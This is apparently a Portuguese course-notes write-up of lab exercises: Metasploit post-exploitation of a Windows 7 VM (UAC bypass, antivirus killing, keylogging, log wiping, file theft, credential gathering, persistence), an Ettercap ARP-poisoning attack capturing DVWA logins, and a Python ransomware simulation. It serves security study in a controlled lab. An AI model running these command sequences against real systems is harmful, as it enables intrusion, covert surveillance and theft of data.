Na VM **Windows 7** executou-se novamente o bin√°rio malicioso para que a sess√£o **Meterpreter** fosse estabelecida. Com a sess√£o ativa, comandos de reconhecimento e controle foram executados pelo **Meterpreter**: `sysinfo` (informa√ß√µes do sistema), `getuid` (identifica√ß√£o do usu√°rio atual), `getpid` (PID do processo da sess√£o) e `getsystem` (tentativa de eleva√ß√£o para privil√©gios do sistema). Como a sess√£o inicial estava atrelada ao processo filho originado pela execu√ß√£o do bin√°rio (artefato), foi feita migra√ß√£o para um processo mais est√°vel (`explorer.exe`) usando `ps` para listar os processos existentes e `migrate 1380` para migra√ß√£o, onde `1380` era o PID do `explorer.exe`. A confirma√ß√£o da migra√ß√£o (altera√ß√£o do PID da sess√£o) pode ser vista na imagem 06.

<div align="Center"><figure>
    <img src="../0-aux/md4-img06.png" alt="img06"><br>
    <figcaption>Imagem 06.</figcaption>
</figure></div><br>

Quando o arquivo `Update.exe` era executado no **Windows 7**, um processo era criado. O **Meterpreter** era carregado dentro desse processo como uma thread; portanto, a sess√£o aberta teria o PID desse processo e o mesmo usu√°rio. Como no **Windows 7** a instala√ß√£o do `Update.exe` era feita pelo usu√°rio `pedro`, o processo tamb√©m pertencia ao usu√°rio `pedro`.

O comando `getsystem` tentava elevar os privil√©gios dessa sess√£o para o n√≠vel mais alto do **Windows** (`NT AUTHORITY/SYSTEM`). Ele testava automaticamente v√°rios m√©todos de eleva√ß√£o de privil√©gios: Named Pipe Impersonation, Token Duplication, RPCSS, PrintSpooler e outros. O *Named Pipe Impersonation* √© uma t√©cnica que explora a forma como o **Windows** trata named pipes ‚Äî canais de comunica√ß√£o usados entre processos.

No **Windows**, cada processo possui threads e um token de seguran√ßa. Esse token informa quem √© o usu√°rio, os grupos e quais permiss√µes o processo tem. O **Meterpreter** criava um named pipe controlado por ele e enganava um processo SYSTEM para que se conectasse a esse pipe. Quando isso ocorria, ele capturava o token desse processo SYSTEM e aplicava esse token a uma nova thread dentro do processo comprometido. Com isso, o processo continuava pertencendo ao usu√°rio `pedro`, mas a thread usada pela sess√£o do **Meterpreter** passava a operar com privil√©gios SYSTEM. A thread original ‚Äî que ainda usava o token de seguran√ßa do usu√°rio `pedro` ‚Äî continuava existindo dentro do processo.

A thread SYSTEM permanecia v√°lida apenas enquanto a sess√£o do **Meterpreter** estivesse ativa. Por isso, ao colocar a sess√£o em background e voltar para ela, executar novamente `getsystem` resultava em erro: j√° existia uma thread com um token SYSTEM dentro daquele processo. Al√©m disso, ao abrir shells a partir dessa sess√£o, o token herdado era o token original do processo (usu√°rio `pedro`), e n√£o o token SYSTEM aplicado √† thread usada pelo **Meterpreter**. Dessa forma, o `getsystem` n√£o resolvia completamente a quest√£o da eleva√ß√£o de privil√©gios para fora do contexto do **Meterpreter**, j√° que o token SYSTEM n√£o substitu√≠a o token do processo, apenas era usado por uma thread espec√≠fica criada pelo **Meterpreter**.

O pr√≥ximo passo foi acessar o shell do **Windows** por meio do comando `shell` atrv√©s do **Meterpreter**. No **Windows 7**, era poss√≠vel acompanhar a abertura do shell e os processos em execu√ß√£o diretamente pelo **Task Manager (Gerenciador de Tarefas)**. Com o comando `whoami`, verificou-se qual usu√°rio estava em uso ‚Äî no caso, o usu√°rio `pedro`, e n√£o o administrador. Em seguida, o comando `whoami /priv` exibiu a lista de privil√©gios atribu√≠dos a esse usu√°rio, indicando quais permiss√µes estavam habilitadas e quais n√£o, conforme mostrado na imagem 07. Por fim, o shell foi encerrado utilizando o comando `exit`.

<div align="Center"><figure>
    <img src="../0-aux/md4-img07.png" alt="img07"><br>
    <figcaption>Imagem 07.</figcaption>
</figure></div><br>

Como observado, o escalonamento de privil√©gios n√£o foi obtido corretamente. Por isso, recorreu-se ao **User Account Control (UAC)**, mecanismo de controle de acesso do **Windows**, e construiu-se uma segunda sess√£o com o objetivo de elevar privil√©gios. A sess√£o em uso foi ent√£o enviada para segundo plano com `background` e sua presen√ßa confirmada com `sessions`.  

Para localizar m√≥dulos relacionados ao UAC, foi executado `search uac` e escolheu-se `exploit/windows/local/bypassuac` com `use exploit/windows/local/bypassuac`. As op√ß√µes do m√≥dulo foram listadas com `show options`. Para definir o payload, executou-se `set payload windows/meterpreter/reverse_tcp`. Com `show targets` foram verificadas as arquiteturas suportadas pelo m√≥dulo. Como a VM **Windows 7** era 32 bits, selecionou-se o alvo `0` (`set target Windows\ x86`). Em seguida, foi configurado o host atacante e a porta com `set lhost 192.168.56.101` e `set lport 2022`. O comando `show options` foi usado novamente para confirmar as configura√ß√µes. A sess√£o inicial (estabelecida pelo backdoor) foi indicada com `set session 1`. Por fim, a explora√ß√£o foi iniciada com `exploit`, executando-se a a√ß√£o na VM **Windows 7**, conforme imagem 08. Essa explora√ß√£o estabeleceu uma outra sess√£o reversa, que foi adicionada √† lista de sess√µes com `background`.  

<div align="Center"><figure>
    <img src="../0-aux/md4-img08.png" alt="img08"><br>
    <figcaption>Imagem 08.</figcaption>
</figure></div><br>

Aqui, a porta utilizada poderia ser qualquer uma, pois a sess√£o j√° estabelecida pelo artefato malicioso continuava sendo reaproveitada. Essa segunda sess√£o, ao ser iniciada, criou um novo processo com PID `2172` e nome aleat√≥rio dentro da pasta de arquivos tempor√°rios do **Windows**, respons√°vel por manter a comunica√ß√£o ativa.

Para visualizar as duas sess√µes criadas, foi executado o comando `sessions`. Em seguida, utilizou-se a sess√£o que havia acabado de ser constru√≠da com o comando `sessions 2`. Dentro dessa sess√£o, foi executado `getuid` para confirmar o usu√°rio, que ainda era `pedro`. O comando `getsystem`, que havia sido usado anteriormente na tentativa de escalonamento de privil√©gios, foi executado novamente. O usu√°rio foi alterado para `NT AUTHORITY/SYSTEM`, sendo essa mudan√ßa confirmada com `getuid`. Na sequ√™ncia, abriu-se um shell com o comando `shell` e executou-se `whoami` para verificar o usu√°rio desse shell, que tamb√©m era `NT AUTHORITY/SYSTEM`. O comando `whoami /priv` exibiu todas as permiss√µes associadas a esse usu√°rio. A imagem 09 evidencia o escalonamento de privil√©gios realizado com sucesso.  

<div align="Center"><figure>
    <img src="../0-aux/md4-img09.png" alt="img09"><br>
    <figcaption>Imagem 09.</figcaption>
</figure></div><br>

Agora o comando `getsystem` funcionou corretamente por causa do bypass do **User Account Control (UAC)** permitido nesse contexto. Ap√≥s elevar os privil√©gios, ao colocar a sess√£o em background, o usu√°rio permanecia como `NT AUTHORITY/SYSTEM`. Da mesma forma, ao abrir um shell a partir dessa sess√£o, o contexto tamb√©m continuava com privil√©gios de `SYSTEM`.

A segunda p√≥s-explora√ß√£o foi a extra√ß√£o de dados (exfiltra√ß√£o). Todas as p√≥s-explora√ß√µes ocorreram na VM **Windows 7**. Nesse alvo, foi criado um arquivo de texto chamado `flag` com o conte√∫do `flag` no diret√≥rio `Documents`. 

No **Kali Linux**, com o **Meterpreter** ativo no **msfconsole** e utilizando a segunda sess√£o (que possu√≠a privil√©gios administrativos), comandos para extrair o conte√∫do desse arquivo foram executados. Primeiro, rodou-se `run post/windows/manage/killav` para encerrar um eventual antiv√≠rus em execu√ß√£o no alvo. Em seguida, criou-se uma terceira sess√£o utilizando o **VNC** (`run vnc`) para estabelecer uma visualiza√ß√£o gr√°fica em tempo real do sistema, conforme demonstrado na imagem 10, onde o **Notepad** foi aberto e utilizado.  

<div align="Center"><figure>
    <img src="../0-aux/md4-img10.png" alt="img10"><br>
    <figcaption>Imagem 10.</figcaption>
</figure></div><br>

O comando `screenshare` abriu a visualiza√ß√£o gr√°fica do sistema no navegador do **Kali**. Em seguida, a sess√£o foi encerrada com `Ctrl + C` e a captura de teclas foi iniciada com `keyscan_start`, que registrava tudo o que era digitado pelo usu√°rio. Para evidenciar a captura, foi aberto o **Notepad** na VM **Windows 7** e digitado `meu nome e pedro`. No **Meterpreter**, os registros foram recuperados com `keyscan_dump`, confirmando que a intera√ß√£o no **Notepad** foi capturada, conforme imagem 11. Para encerrar a captura foi executado `keyscan_stop`.

<div align="Center"><figure>
    <img src="../0-aux/md4-img11.png" alt="img11"><br>
    <figcaption>Imagem 11.</figcaption>
</figure></div><br>

O comando `clearev` era usado para limpar diversos logs do sistema no alvo. Em seguida, executou-se `search -d C:/Users -f *.txt` para procurar, no diret√≥rio de usu√°rios do **Windows 7**, todos os arquivos de texto (`*.txt`). O output retornava os caminhos dos arquivos encontrados. Aqui, mesmo tendo permiss√£o de administrador, pode ocorrer devido a erro de permiss√£o, que pode est√° associado ao PID vinculado. Quando a segunda sess√£o foi criada foi destinado um PID aleat√≥rio. Dessa forma, foi necess√°rio migrar novamente com o comando `migrate 1380` alterando para o processo `explorer.exe`.

Para transferir o arquivo de interesse, utilizou-se `download C:/Users/pedro/Documents/flag.txt`, que baixou o arquivo `flag.txt` para a pasta do **Kali** em `/root`. Na interface gr√°fica do **Kali**, navegou-se at√© essa pasta com o Gerenciador de Arquivos e o arquivo foi aberto para confirmar o conte√∫do. A imagem 12 exibe a informa√ß√£o capturada no arquivo.

<div align="Center"><figure>
    <img src="../0-aux/md4-img12.png" alt="img12"><br>
    <figcaption>Imagem 12.</figcaption>
</figure></div><br>

Assim como existe o comando `download`, h√° tamb√©m o comando `upload`. Foi criado em `/root` o arquivo `testupload.txt` com o conte√∫do `test upload`. Na sess√£o do **Meterpreter** executou-se `upload /root/testupload.txt C:/Users/pedro/Documents/`, transferindo o arquivo para a m√°quina **Windows 7**. Em seguida, abriu-se o arquivo pela interface do **Windows** para confirmar o conte√∫do, conforme mostrado na imagem 13.

<div align="Center"><figure>
    <img src="../0-aux/md4-img13.png" alt="img13"><br>
    <figcaption>Imagem 13.</figcaption>
</figure></div><br>

No **Metasploit** existem diversos m√≥dulos voltados √† extra√ß√£o de informa√ß√µes e dados, tais como extra√ß√£o de credenciais, escalonamento de privil√©gios, captura de informa√ß√µes e espionagem de dados. No console do **Metasploit** no **Kali**, a sess√£o em uso foi jogada para segundo plano. Em seguida, carregou-se o m√≥dulo `use post/windows/manage/migrate` e suas op√ß√µes foram verificadas com `show options`. Esse m√≥dulo exigia uma sess√£o j√° estabelecida e automatizava a migra√ß√£o para outro processo.  

Como a migra√ß√£o havia sido feita manualmente durante o escalonamento de privil√©gios, desta vez automatizou-se o procedimento definindo a sess√£o privilegiada com `set session 2` e executando o m√≥dulo com `run`, o que provocou a migra√ß√£o para outro PID. Ao retornar √† sess√£o com `sessions 2`, todos os processos foram listados com `ps` para identificar o processo alvo da migra√ß√£o. A imagem 14 mostra que a sess√£o migrou para o PID `2696`, correspondente ao **Notepad**.

<div align="Center"><figure>
    <img src="../0-aux/md4-img14.png" alt="img14"><br>
    <figcaption>Imagem 14.</figcaption>
</figure></div><br>

Foram testados v√°rios outros m√≥dulos do **Metasploit**, sempre seguindo a mesma sequ√™ncia: `use` para selecionar o m√≥dulo, `show options` para conferir as configura√ß√µes, `set session` para indicar a sess√£o alvo, e `run` ou `exploit` para execut√°-lo ‚Äî al√©m de outras configura√ß√µes com `set`, quando exigidas. Abaixo est√° a lista dos m√≥dulos testados e o prop√≥sito de cada um:
- `use post/windows/gather/checkvm`, `set session 2`, `run`: identificava que a m√°quina alvo era uma m√°quina virtual (Imagem 15).  
- `use post/windows/gather/enum_shares`, `set session 2`, `exploit`: enumerava pastas compartilhadas; n√£o sendo encontrada nenhuma (Imagem 15).
- `use post/windows/gather/enum_applications`, `set session 2`, `run`: listava algumas aplica√ß√µes e processos em execu√ß√£o (Imagem 15).  
- `use post/windows/gather/dumplinks`, `set session 2`, `run`: coletava os links e arquivos acessados pelo usu√°rio (Imagem 15).  
- `use post/windows/gather/credentials/credential_collector`, `set session 2`, `run`: capturava credenciais armazenadas no sistema.  
- `use post/windows/gather/arp_scanner`, `set rhosts 192.168.56.1/24`, `set session 2`, `run`: identificava os IPs ativos na rede local.  
- `use post/multi/recon/local_exploit_suggester`, `set SHOWDESCRIPTION true`, `set session 2`, `run`: sugeria exploits apropriados com base na arquitetura e nas informa√ß√µes coletadas da m√°quina alvo (Imagem 16).  

<div align="Center"><figure>
    <img src="../0-aux/md4-img15.png" alt="img15"><br>
    <figcaption>Imagem 15.</figcaption>
</figure></div><br>

<div align="Center"><figure>
    <img src="../0-aux/md4-img16.png" alt="img16"><br>
    <figcaption>Imagem 16.</figcaption>
</figure></div><br>

At√© ent√£o, todo o processo era feito manualmente: tanto a cria√ß√£o do handler (listener) na m√°quina de ataque quanto a gera√ß√£o e execu√ß√£o do artefato malicioso com o payload de shell reverso do **Meterpreter**. O passo seguinte consistiu em automatizar uma dessas etapas do backdoor ‚Äî a cria√ß√£o do handler ‚Äî por meio de um arquivo de script. Para isso, o arquivo [meterpreter.rc](./meterpreter.rc) foi criado com `nano meterpreter.rc`, reproduzindo exatamente o mesmo fluxo de execu√ß√£o do listener. A execu√ß√£o do script foi realizada com `msfconsole -r meterpreter.rc`, permitindo estabelecer a conex√£o com o alvo sem a necessidade de digitar cada comando manualmente. Vale ressaltar que o bin√°rio (artefato) contendo o payload precisava estar em execu√ß√£o na VM **Windows 7** para que a sess√£o fosse aberta. A imagem 17 mostra a sess√£o sendo estabelecida e enviada para segundo plano a partir do arquivo de script.

<div align="Center"><figure>
    <img src="../0-aux/md4-img17.png" alt="img17"><br>
    <figcaption>Imagem 17.</figcaption>
</figure></div><br>

A √∫ltima p√≥s-explora√ß√£o teve como objetivo manter a conex√£o com a m√°quina alvo mesmo ap√≥s reinicializa√ß√µes ou perda da sess√£o. Para isso, utilizou-se o recurso de *persistence* do **Metasploit**, que permite configurar um **Meterpreter** persistente no sistema comprometido.

Ao abrir o **msfconsole** no **Kali Linux**, observou-se que o encerramento anterior do console havia finalizado todas as sess√µes ativas. Caso o console ainda estivesse aberto, as tr√™s sess√µes criadas anteriormente apareceriam ao executar `sessions`, sendo a sess√£o 2 aquela que possu√≠a privil√©gios administrativos. Se apenas a sess√£o inicial estivesse presente ‚Äî sem privil√©gios elevados ‚Äî seria necess√°rio repetir o processo de escalonamento de privil√©gios realizado na primeira p√≥s-explora√ß√£o deste curso, utilizando o bypass de **UAC**.

Se a sess√£o inicial tamb√©m n√£o existisse, ela poderia ser recriada automaticamente pelo script ou manualmente, utilizando os mesmos passos j√° executados: selecionar o m√≥dulo `use exploit/multi/handler`, definir o payload com `set payload windows/meterpreter/reverse_tcp`, configurar o endere√ßo de escuta com `set lhost 192.168.56.101` e a porta com `set lport 4444`, e ent√£o executar `exploit`.

Ap√≥s obter a sess√£o com privil√©gios administrativos ‚Äî no caso, a sess√£o 2 ‚Äî ela foi enviada para segundo plano com `background`, pois seria utilizada pelo m√≥dulo de persist√™ncia, que exigia permiss√µes administrativas para ser executado. O m√≥dulo foi selecionado com `use exploit/windows/local/persistence_service`, este instalava um execut√°vel na pasta tempor√°ria do alvo e configurava uma forma de execu√ß√£o que sobrevivia a reinicializa√ß√µes. As op√ß√µes foram verificadas com `show options`, definindo a sess√£o com `set session 2` (a sess√£o com privil√©gios administrativos), o host controlador `set lhost 192.168.56.101` e a porta `set lport 2022`. Ao executar `exploit`, foi criada uma nova sess√£o **Meterpreter** a partir do execut√°vel tempor√°rio `C:\Users\pedro\AppData\Local\Temp\a.exe`. A imagem 18 apresenta a sess√£o persistente gerada.

<div align="Center"><figure>
    <img src="../0-aux/md4-img18.png" alt="img18"><br>
    <figcaption>Imagem 18.</figcaption>
</figure></div><br>

Ap√≥s reiniciar a VM **Windows 7**, confirmou-se que o execut√°vel do exploit permaneceu na pasta tempor√°ria. Entretanto, as tr√™s sess√µes do **Metasploit** foram encerradas, pois cada uma delas estava vinculada a um processo espec√≠fico, e todos os processos foram finalizados durante a reinicializa√ß√£o, interrompendo a comunica√ß√£o.  

Como o execut√°vel do exploit permanecia na pasta tempor√°ria, ao iniciar o sistema novamente ele era executado automaticamente, iniciando seu processo. Dessa forma, um processo na m√°quina alvo voltava a tentar se comunicar com a m√°quina de ataque. Para que a sess√£o persistente fosse recriada, bastava iniciar um listener na mesma porta configurada (`2022`). Isso poderia ser feito manualmente ou por meio de um script, bastando substituir o comando `set lport 4444` por `set lport 2022`. Dentro da nova sess√£o **Meterpreter**, utilizou-se o comando `dir` para listar os arquivos do diret√≥rio atual, exibindo o execut√°vel persistente. A imagem 19 mostra que a sess√£o persistente foi restabelecida.

<div align="Center"><figure>
    <img src="../0-aux/md4-img19.png" alt="img19"><br>
    <figcaption>Imagem 19.</figcaption>
</figure></div><br>

<a name="item4.3"><h4>4.3 Man in the Middle: Ataques e Mitiga√ß√µes</h4></a>[Back to summary](#item4) | <a href="https://github.com/PedroHeeger/my_tech_journey/blob/main/credentials/certificates/online_courses/cybersecurity/251106_MitM...Ataques..PH_DIO.pdf">Certificate</a>

üïµÔ∏è Ataques Man in the Middle   
Os ataques **Man in the Middle (MitM)** consistem em uma t√©cnica na qual o invasor se posiciona entre duas partes que acreditam estar se comunicando diretamente. Dessa forma, o atacante intercepta, altera ou redireciona os dados trocados, podendo monitorar informa√ß√µes sens√≠veis, manipular conte√∫dos ou at√© redirecionar o tr√°fego para sites falsos. Esse tipo de ataque √© considerado uma forma de espionagem digital, pois ocorre sem o conhecimento das v√≠timas e em tempo real. O fluxo normal de comunica√ß√£o acontece entre **Cliente ‚Üî Servidor**, mas em um ataque MitM, o invasor se insere no meio da comunica√ß√£o: **Cliente ‚Üî MITM ‚Üî Servidor**.  

üîë Conceitos principais   
O ataque Man in the Middle pode ser entendido como um sequestro de sess√£o, no qual o invasor atua como um retransmissor ou proxy dentro de uma conex√£o leg√≠tima. Assim, √© poss√≠vel capturar dados, modificar mensagens trocadas e at√© injetar conte√∫dos maliciosos durante a comunica√ß√£o. Entre as consequ√™ncias mais comuns est√£o o roubo de senhas, acesso a informa√ß√µes banc√°rias e intercepta√ß√£o de dados pessoais.  

üß∞ Ferramentas utilizadas   
Para executar ou analisar ataques do tipo MitM, existem diversas ferramentas que permitem a captura e manipula√ß√£o de pacotes de rede:  
- **WireShark**: analisador de protocolos que captura pacotes em tempo real, permitindo visualizar o conte√∫do detalhado das comunica√ß√µes de rede.  
- **Ettercap**: su√≠te voltada para ataques MitM, com recursos de sniffing de conex√µes, filtragem de conte√∫do e dissec√ß√£o de protocolos em tempo real.  
- **Cain & Abel**: ferramenta cl√°ssica de recupera√ß√£o de senhas e an√°lise de tr√°fego.  
- **Bettercap**: plataforma moderna para an√°lise e explora√ß√£o de redes, com suporte a ataques de envenenamento ARP e DNS spoofing.  
- **M√°quinas virtuais**: usadas em ambientes controlados para testar e estudar esses tipos de ataques de forma segura.  

üì° Wireshark   
O **Wireshark** √© um software open source amplamente utilizado para an√°lise de tr√°fego de rede. Ele atua como um *sniffer*, capturando pacotes que trafegam pela camada TCP/IP e permitindo examinar detalhadamente os dados transmitidos.  
Principais recursos do Wireshark:  
- **Captura de pacotes:** monitora o tr√°fego de rede em tempo real.  
- **Filtragem:** permite aplicar filtros para isolar pacotes espec√≠ficos de interesse.  
- **Visualiza√ß√£o:** exibe de forma estruturada o conte√∫do de cada pacote, facilitando a an√°lise e o diagn√≥stico.  

üíª Ettercap   
O **Ettercap** √© uma ferramenta poderosa para execu√ß√£o de ataques Man in the Middle, oferecendo modos de opera√ß√£o variados para diferentes cen√°rios de rede. Ele suporta sniffing ativo e passivo, filtragem de conte√∫do e an√°lise detalhada de protocolos.  

Modos de opera√ß√£o:  
- **Baseado em IP:** filtra pacotes conforme os endere√ßos IP de origem e destino.  
- **MAC:** analisa pacotes de acordo com o endere√ßo f√≠sico (MAC address), √∫til em conex√µes via gateway.  
- **ARP:** utiliza o envenenamento ARP (ARP Poisoning) para interceptar comunica√ß√µes entre dois hosts em uma rede local (full-duplex).  
- **PublicARP:** realiza o envenenamento ARP para capturar tr√°fego de um host espec√≠fico para todos os outros da rede (half-duplex).  

üí£ Conclus√£o   
Os ataques Man in the Middle est√£o entre os mais cr√≠ticos na √°rea de seguran√ßa da informa√ß√£o devido ao seu alto potencial de danos. Eles comprometem a confidencialidade e integridade das comunica√ß√µes, podendo resultar em graves viola√ß√µes de privacidade e perdas financeiras. O estudo e a pr√°tica controlada dessas t√©cnicas em ambientes laboratoriais s√£o essenciais para compreender seus mecanismos e desenvolver medidas de defesa eficazes.

##### Parte Pr√°tica

Para a parte pr√°tica deste curso foram utilizadas as m√°quinas virtuais **Kali Linux** e **Metasploitable** no **Oracle VM VirtualBox**. No **Kali Linux**, a interface em uso devia estar conectada √† rede *host-only*; caso estivesse desconectada, alternava-se para ela com `nmcli device connect eth1`. No navegador do **Kali**, acessou-se a aplica√ß√£o web vulner√°vel **DVWA** hospedada no **Metasploitable** pelo endere√ßo `http://192.168.56.102/dvwa`, conforme imagem 20.

<div align="Center"><figure>
    <img src="../0-aux/md4-img20.png" alt="img20"><br>
    <figcaption>Imagem 20.</figcaption>
</figure></div><br>

O **Wireshark** tamb√©m foi utilizado no **Kali** via interface gr√°fica. Nele, a interface conectada (host-only ‚Äî `eth1`) foi selecionada. Embora fosse poss√≠vel ajustar diversas op√ß√µes em `Capture Options`, manteve-se a configura√ß√£o padr√£o e iniciou-se a captura. As janelas do **Wireshark** e da **DVWA** foram dispostas lado a lado para acompanhar em tempo real o tr√°fego gerado. Ao atualizar a p√°gina de login da **DVWA**, o **Wireshark** passou a registrar os pacotes trocados. A imagem 21 mostra essa primeira captura.

<div align="Center"><figure>
    <img src="../0-aux/md4-img21.png" alt="img21"><br>
    <figcaption>Imagem 21.</figcaption>
</figure></div><br>

Foi selecionado um pacote do tipo `GET` para inspe√ß√£o das informa√ß√µes. Em seguida, o formul√°rio de login da **DVWA** foi preenchido com `admin:password` e enviado. A autentica√ß√£o foi processada e os dados submetidos foram capturados pelo **Wireshark**. Para localizar as credenciais capturadas, aplicou-se o filtro `http.request.method == "POST"`, que isolou a √∫nica requisi√ß√£o `POST`. Ao selecionar esse pacote, expandiu-se a se√ß√£o `HTML Form URL Encoded` nas informa√ß√µes do pacote, revelando o `username` e o `password` utilizados. A imagem 22 ilustra essa captura.

<div align="Center"><figure>
    <img src="../0-aux/md4-img22.png" alt="img22"><br>
    <figcaption>Imagem 22.</figcaption>
</figure></div><br>

Essa informa√ß√£o foi capturada porque a **DVWA** utilizava uma conex√£o n√£o criptografada ‚Äî protocolo HTTP em vez de HTTPS. Al√©m do filtro por m√©todo de requisi√ß√£o usado anteriormente, tamb√©m aplicou-se um filtro por endere√ßo IP da m√°quina **Kali** com `ip.addr == 192.168.56.102`, isolando apenas os pacotes originados ou destinados a esse host. A imagem 23 mostra os pacotes resultantes desse filtro.

<div align="Center"><figure>
    <img src="../0-aux/md4-img23.png" alt="img23"><br>
    <figcaption>Imagem 23.</figcaption>
</figure></div><br>

O pr√≥ximo passo foi utilizar o **Ettercap**, ferramenta j√° inclu√≠da no **Kali Linux**, para executar um ataque Man-in-the-Middle (MitM). O **Ettercap** oferece funcionalidades de captura semelhantes ao **Wireshark**, al√©m de recursos ativos de manipula√ß√£o de tr√°fego. A interface gr√°fica foi iniciada com `ettercap -G`. Para a atividade, foi necess√°rio ligar a VM **Windows 7**, pois a simula√ß√£o contou com tr√™s pap√©is: cliente (**Windows 7**), servidor (**Metasploitable**) e o MitM (**Kali Linux**) ‚Äî todos na mesma rede *host-only*.

O ataque empregado foi o envenenamento de ARP, que for√ßa as v√≠timas a redirecionarem seu tr√°fego para o atacante ao manipular as entradas do cache ARP. Em termos simples, o ARP (Address Resolution Protocol) resolve endere√ßos IP para endere√ßos MAC; ao enviar respostas ARP falsificadas, o atacante faz com que o IP de um host passe a apontar para o seu pr√≥prio MAC, centrando assim o tr√°fego no MitM e confundindo as partes comunicantes.

No **Ettercap** desativou-se o sniffing autom√°tico ao iniciar e a interface de rede `eth1` (host-only) foi selecionada. O modo de sniffing *bridged* permaneceu desativado. Ap√≥s confirmar essas configura√ß√µes iniciais, o primeiro passo foi escanear os hosts, j√° que a *hostlist* estava vazia ‚Äî o scan foi acionado pelo √≠cone de lupa e os hosts visualizados no √≠cone ao lado. O **Ettercap** adicionou automaticamente os hosts encontrados √† *hostlist*. Nesse caso, foram identificados quatro hosts: as tr√™s m√°quinas utilizadas no exerc√≠cio e o servidor DHCP da rede *host-only*. A imagem 24 exibe a *hostlist* resultante.

<div align="Center"><figure>
    <img src="../0-aux/md4-img24.png" alt="img24"><br>
    <figcaption>Imagem 24.</figcaption>
</figure></div><br>

O host `192.168.56.102` (VM **Metasploitable**) foi adicionado como *Target 1*, e o host `192.168.56.103` (VM **Windows 7**) foi definido como *Target 2*. Essas duas m√°quinas representavam, respectivamente, o servidor e o cliente ‚Äî a ordem de adi√ß√£o dos targets n√£o afetava o ataque. Para verificar os alvos definidos, abriu-se o menu de retic√™ncias verticais e selecionou-se `Targets` ‚Üí `Current Targets`, conforme mostrado na imagem 25.

<div align="Center"><figure>
    <img src="../0-aux/md4-img25.png" alt="img25"><br>
    <figcaption>Imagem 25.</figcaption>
</figure></div><br>

No terminal, habilitou-se o encaminhamento de pacotes com `sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'` ‚Äî por padr√£o esse valor √© `0` (desabilitado) e, ao torn√°-lo `1`, permitia-se o redirecionamento de tr√°fego. Em seguida,o envenenamento ARP foi configurado para manipular as tabelas ARP dos hosts e capturar o tr√°fego entre eles: no **Ettercap** abriu-se o menu (√≠cone de globo), selecionou-se `ARP poisoning`, marcando a op√ß√£o `Sniff remote connections` e confirmando. Assim, o tr√°fego entre o **Windows 7** e o **Metasploitable** passou a ser encaminhado para o **Kali**.  

Antes de iniciar o ataque, iniciou-se a captura no **Wireshark** para monitorar o tr√°fego; depois o ataque no **Ettercap** foi acionado pelo bot√£o de play. No **Wireshark** o filtro `arp` foi aplicado para visualizar os pacotes gerados pelo envenenamento. A imagem 26 mostrava os pacotes capturados.

<div align="Center"><figure>
    <img src="../0-aux/md4-img26.png" alt="img26"><br>
    <figcaption>Imagem 26.</figcaption>
</figure></div><br>

No **DVWA**, acess√≠vel em `http://192.168.56.102/dvwa` a partir do **Windows 7**, realizou-se o login com `admin:password`. Imediatamente essa credencial foi capturada pelo **Ettercap** e exibida em seu terminal, conforme ilustrado na imagem 27.

<div align="Center"><figure>
    <img src="../0-aux/md4-img27.png" alt="img27"><br>
    <figcaption>Imagem 27.</figcaption>
</figure></div><br>

<a name="item4.4"><h4>4.4 Desafio de projeto: Entendendo um Ransomware na Pr√°tica com Python</h4></a>[Back to summary](#item4) | <a href="https://github.com/PedroHeeger/my_tech_journey/blob/main/credentials/certificates/online_courses/cybersecurity/251109_DP...Ransomware...Python_PH_DIO.pdf">Certificate</a>

Neste desafio de projeto o objetivo foi criar dois arquivos em **Python** que criptografavam e descriptografavam o conte√∫do de um terceiro arquivo de texto, simulando um ransomware. Os dois scripts utilizavam as bibliotecas `os` e `pyaes`. Da `pyaes` foi empregado o **Advanced Encryption Standard (AES)**, algoritmo de cifra sim√©trica padronizado pelo NIST. O **AES** cifra blocos de 128 bits e aceita chaves de 128, 192 ou 256 bits. No c√≥digo, o **AES** foi usado no modo `CTR` (Counter), que gera um fluxo de bytes a partir de contadores criptografados ‚Äî o chamado `keystream` ‚Äî e combina esse fluxo com o conte√∫do do arquivo por meio da opera√ß√£o `XOR`, funcionamento semelhante ao de um cifrador por fluxo. Em termos pr√°ticos, o bin√°rio do conte√∫do √© misturado, byte a byte (ou bit a bit), com o bin√°rio do `keystream`: cada byte do dado √© `XOR`ado com o correspondente byte do `keystream`. A opera√ß√£o `XOR` resulta em `1` apenas quando os bits de entrada s√£o diferentes, e aplicar `XOR` duas vezes com o mesmo `keystream` reverte o processo (criptografia ‚áÑ descriptografia). A chave utilizada foi `testeransomwares`, com 16 bytes (128 bits).

Os arquivos, chamados [encrypter.py](./dp_ransomware/encrypter.py) e [decrypter.py](./dp_ransomware/decrypter.py), eram muito parecidos. Basicamente, eles acessavam o arquivo [teste.txt](./dp_ransomware/teste.txt) (ou `teste.txt.ransomwaretroll`), liam seu conte√∫do e deletavam o arquivo original. A informa√ß√£o lida era armazenada em mem√≥ria e utilizada para criptografar ou descriptografar. Em seguida, criava-se um novo arquivo onde o dado processado era salvo, concluindo o processo.

O arquivo de texto ‚Äî tanto antes quanto depois da criptografia ‚Äî era sempre procurado e salvo na pasta corrente, ou seja, na pasta onde o c√≥digo **Python** era executado. Por isso, criou-se uma pasta dedicada com `mkdir dp_ransomware` no **Kali Linux**, acessou-se ela com `cd dp_ransomware` e ent√£o foram constru√≠dos os tr√™s arquivos. Para checar o conte√∫do antes da encripta√ß√£o, utilizou-se `cat teste.txt`. A imagem 28 mostra os tr√™s arquivos na pasta e o conte√∫do de `teste.txt` antes de ser criptografado.

<div align="Center"><figure>
    <img src="../0-aux/md4-img28.png" alt="img28"><br>
    <figcaption>Imagem 28.</figcaption>
</figure></div><br>

Antes da execu√ß√£o do script, foi necess√°rio configurar algumas defini√ß√µes. Como os dois arquivos utilizavam a biblioteca **pyaes**, era preciso instal√°‚Äëla. Contudo, o **Kali Linux** impedia a instala√ß√£o de bibliotecas **Python** globalmente. Portanto, foi necess√°rio usar o m√≥dulo **virtualenv (venv)**, que cria ambientes virtuais para **Python**. O **Kali** j√° possu√≠a esse m√≥dulo; caso n√£o possu√≠sse, o comando para instal√°‚Äëlo era `sudo apt install python3-venv`. Ap√≥s isso, o ambiente virtual foi criado na pasta do projeto com `python3 -m venv ~/dp_ransomware`. Com `source ~/dp_ransomware/bin/activate` o ambiente foi ativado, o que foi confirmado por `echo "$VIRTUAL_ENV"`. Para desativar, usava‚Äëse `deactivate`. Dessa forma, todas as depend√™ncias Python passaram a ser instaladas apenas naquele diret√≥rio do projeto. O **pyaes** foi instalado com `pip install pyaes`, permitindo a continua√ß√£o do desenvolvimento do projeto.

